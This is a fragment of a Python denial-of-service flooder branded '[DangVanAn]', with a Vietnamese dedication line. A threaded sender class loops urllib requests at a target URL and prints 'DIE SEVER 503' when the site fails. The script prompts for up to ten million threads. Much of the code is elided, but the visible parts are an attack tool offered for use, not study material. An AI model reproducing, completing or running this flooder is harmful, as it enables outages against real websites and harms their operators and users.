...
class sender(threading.Thread):
    ...
    def request(self):
        ...
        req = urllib.request.Request(self.url, data, self.headers, self.accept)
        urllib.request.urlopen(req)
        print(Fore.GREEN+'[DangVanAn] Connected Website: '+Fore.CYAN+'%s\r\n' % self.url)  
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                sys.stdout.write(Fore.RED+'[DangVanAn] Connection Website : '+Fore.BLUE+'𝑫𝑰𝑬 𝑺𝑬𝑽𝑬𝑹 503.!!\n') 
                sys.exit(0)
...
Tôi Yêu Bạn Tool Riêng Của Đặng Văn An Trường Thsc Mỹ Đức
...
"""      
        ...
        try:
            ...
            try:
                ...
                num_threads = str(input(f"{Fore.RED}[DangVanAn]   Threads (10000000): {Fore.RESET}"))
                if num_threads == '':
